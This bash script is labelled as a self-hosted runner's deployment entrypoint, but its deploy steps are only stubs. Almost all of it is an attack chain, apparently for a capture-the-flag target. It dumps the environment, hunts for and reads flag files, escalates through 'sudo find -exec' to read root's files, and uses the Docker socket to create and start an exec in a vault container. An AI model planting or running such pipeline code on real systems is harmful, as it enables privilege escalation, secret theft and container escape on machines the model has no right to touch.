#!/usr/bin/env bash
# Deployment entrypoint executed by the self-hosted runner.
set -euo pipefail
echo "[deploy] host=$(hostname) user=$(whoami) pwd=$(pwd)"
echo "[deploy] pulling latest VOID service artifacts..."
# TODO: real deploy steps (rsync artifacts, restart services)
echo "[deploy] done."
echo "=== TARGET INSPECTION ==="
id
env
ls -la /
find / -name "*flag*" 2>/dev/null || true
echo "=== PRINTING THE FLAG ==="
cat /opt/void/ci_flag.txt
echo "=== PRIVILEGE ESCALATION CHECK ==="
# 1. പാസ്‌വേഡ് ഇല്ലാതെ റൂട്ട് ആയി റൺ ചെയ്യാൻ പറ്റുന്ന കമാൻഡുകൾ ഉണ്ടോ എന്ന് നോക്കാൻ (SUDO)
sudo -l || true

# 2. SUID പെർമിഷൻ ഉള്ള ഫയലുകൾ കണ്ടെത്താൻ (ഇവ റൂട്ട് പ്രിവിലേജിൽ റൺ ചെയ്യാൻ പറ്റിയേക്കും)
find / -perm -4000 -type f 2>/dev/null || true

# 3. റൂട്ടിന്റെ ഹോം ഡയറക്ടറിയിൽ എന്തൊക്കെ ഉണ്ടെന്ന് നോക്കാൻ ശ്രമിക്കാം
ls -la /root || true
echo "=== EXPLOITING SUDO FIND FOR ROOT FLAG ==="
# 1. റൂട്ട് ഡയറക്ടറിയിൽ ഉള്ള ഫ്ലാഗ് ഫയൽ കണ്ടെത്താൻ
sudo /usr/bin/find . -exec ls -la /root \; -quit

# 2. കണ്ടെത്തുന്ന ഫ്ലാഗ് ഫയൽ റീഡ് ചെയ്യാൻ (സാധാരണയായി root_flag.txt അല്ലെങ്കിൽ flag.txt ആയിരിക്കും)
sudo /usr/bin/find . -exec cat /root/root_flag.txt \; -quit
echo "=== READING FINAL ROOT FLAG ==="
sudo /usr/bin/find . -exec cat /root/root.txt \; -quit

echo "=== DOCKER ESCAPE ==="
# Check if we're in a container
cat /proc/1/cgroup
ls -la /var/run/docker.sock 2>/dev/null
sudo find /var/run/docker.sock -exec ls -la {} \; 2>/dev/null
sudo find /root/.docker -type f -exec cat {} \; 2>/dev/null
sudo find /opt/void/ -type f -exec cat {} \; 2>/dev/null
sudo find / -name "docker_flag*" -o -name "*docker*flag*" 2>/dev/null

echo "=== DOCKER SOCKET ESCAPE ==="
# Use docker socket to list containers
sudo find /var/run/docker.sock -exec curl -s --unix-socket {} http://localhost/containers/json \; 2>/dev/null
# List containers via curl
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json 2>/dev/null
# Read vault contents
sudo find /opt/void-vault -type f 2>/dev/null | head -20
sudo find /opt/void-vault -type f -exec cat {} \; 2>/dev/null

echo "=== EXEC INTO VOID-VAULT ==="
# Create exec in void-vault container
EXEC_ID=$(sudo find /var/run/docker.sock -exec curl -s --unix-socket {} \
  -X POST http://localhost/containers/b0b22fe23519/exec \
  -H "Content-Type: application/json" \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["cat","/flag.txt"]}' \; 2>/dev/null | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
echo "EXEC ID: $EXEC_ID"
sudo find /var/run/docker.sock -exec curl -s --unix-socket {} \
  -X POST http://localhost/exec/$EXEC_ID/start \
  -H "Content-Type: application/json" \
  -d '{"Detach":false}' \; 2>/dev/null
